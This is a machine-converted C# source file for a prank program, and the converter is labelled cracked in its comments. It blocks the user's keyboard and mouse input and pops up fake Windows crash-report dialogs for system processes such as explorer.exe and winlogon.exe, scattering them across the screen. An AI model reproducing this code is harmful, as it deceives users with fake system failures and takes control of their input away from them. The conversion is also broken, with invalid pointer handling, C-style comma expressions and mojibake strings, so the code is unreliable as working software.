#define RANDOMPOP

//-lwer -finput-charset=GBK -fexec-charset=GBK
//C++ TO C# CONVERTER CRACKED BY X-CRACKER 2017 NOTE: The following #define macro was replaced in-line:
//ORIGINAL LINE: #define HREPORT void*
//C++ TO C# CONVERTER CRACKED BY X-CRACKER 2017 NOTE: The following #define macro was replaced in-line:
//ORIGINAL LINE: #define PWER_SUBMIT_RESULT int*

private string[] lpPaths = {"explorer.exe", "taskmgr.exe", "winlogon.exe", "csrss.exe", "dwm.exe", "cmd.exe", "svchost.exe", "conhost.exe", "smss.exe", "wininit.exe", "werfault.exe", "winver.exe", "regedit.exe"};

private HCRYPTPROV prov = new HCRYPTPROV();

private int random()
{
	if (prov == null)
	{
		if (!CryptAcquireContext(prov, null, null, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
		{
			ExitProcess(1);
		}
	}

	int @out;
	CryptGenRandom(prov, sizeof(int), (byte)(@out));
	return @out & 0x7fffffff;
}


//C++ TO C# CONVERTER CRACKED BY X-CRACKER 2017 NOTE: WINAPI is not available in C#:
//ORIGINAL LINE: int WINAPI ReportError(string lpPath, string lpCloseText, string lpDescription)
private int ReportError(string lpPath, string lpCloseText, string lpDescription)
{
	object hReport;
	WER_REPORT_INFORMATION wri = new WER_REPORT_INFORMATION();
	ZeroMemory(wri, sizeof(WER_REPORT_INFORMATION));
	wri.dwSize = sizeof(WER_REPORT_INFORMATION);
	wri.hProcess = GetCurrentProcess();
	lstrcpyW(wri.wzApplicationPath, lpPath);
	int wsr;
	WerReportCreate("123", WerReportApplicationCrash, wri, hReport);

	WerReportSetUIOption(hReport, WerUIIconFilePath, lpPath);
	if (lpCloseText != null)
	{
		WerReportSetUIOption(hReport, WerUICloseText, lpCloseText);
	}

	if (lpDescription != null)
	{
		char[] DlgHeader = new char[565];
		wsprintfW(DlgHeader, "%s ÒÑÍ£Ö¹¹¤×÷", lpDescription);
		WerReportSetUIOption(hReport, WerUIIconFilePath, lpPath);
		WerReportSetUIOption(hReport, WerUIConsentDlgHeader, DlgHeader);
	}

	WerReportSubmit(hReport, WerConsentAlwaysPrompt, 1024 | 8, wsr);
	WerReportCloseHandle(hReport);
	return GetLastError();
}



private int WinMain(System.IntPtr hInstance, System.IntPtr hPrevInstance, string lpCmdLine, int nShowCmd)
{
	//BlockInput(TRUE);
	uint tid;
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	int cx;
	int cy;

#if DRAGACCEPT
	int argc;
	string argv = CommandLineToArgvW(GetCommandLineW(), argc);
	if (argc >= 4)
	{
		ReportError(argv[1], argv[2], argv[3]);
	}
	else if (argc >= 3)
	{
		ReportError(argv[1], argv[2], null);
	}
	else if (argc >= 2)
	{
		ReportError(argv[1], null, null);
	}
	Sleep(50);
	System.IntPtr hwnd = GetForegroundWindow();
	RECT rc = new RECT();
	if (hwnd != null)
	{
		GetWindowRect(hwnd, rc);
		cx = rc.right - rc.left, cy = rc.bottom - rc.top;
		SetWindowPos(hwnd, HWND_TOPMOST, random() % (w - cx), random() % (h - cy), 0, 0, SWP_NOSIZE);
	}

#endif

#if RANDOMPOP
	BlockInput(1);
	for (int i = 0; i < 13; i++)
	{
		string lpDescription = (random() % 3 == 0)?lpPaths[i]:null;
		ReportError(lpPaths[i], "È·¶¨³ÌÐòàÃÆ¨", lpDescription);
		Sleep(50);
		System.IntPtr hwnd = GetForegroundWindow();
		RECT rc = new RECT();
		if (hwnd != null)
		{
			GetWindowRect(hwnd, rc);
			cx = rc.right - rc.left, cy = rc.bottom - rc.top;
			SetWindowPos(hwnd, HWND_TOPMOST, random() % (w - cx), random() % (h - cy), 0, 0, SWP_NOSIZE);
		}

		Sleep(50 + random() % 50);
	}
	BlockInput(0);
#endif
	return 0;
}

internal static class DefineConstants
{
	public const int _WIN32_WINNT = 0x602;
	public const int WER_MAX_PREFERRED_MODULES_BUFFER = 10;
}

//----------------------------------------------------------------------------------------
//	Copyright ©  - 2017 Tangible Software Solutions Inc.
//	This class can be used by anyone provided that the copyright notice remains intact.
//
//	This class provides the ability to replicate the behavior of the C/C++ functions for 
//	generating random numbers, using the .NET Framework System.Random class.
//	'rand' converts to the parameterless overload of NextNumber
//	'random' converts to the single-parameter overload of NextNumber
//	'randomize' converts to the parameterless overload of Seed
//	'srand' converts to the single-parameter overload of Seed
//----------------------------------------------------------------------------------------
internal static class RandomNumbers
{
	private static System.Random r;

	internal static int NextNumber()
	{
		if (r == null)
			Seed();

		return r.Next();
	}

	internal static int NextNumber(int ceiling)
	{
		if (r == null)
			Seed();

		return r.Next(ceiling);
	}

	internal static void Seed()
	{
		r = new System.Random();
	}

	internal static void Seed(int seed)
	{
		r = new System.Random(seed);
	}
}
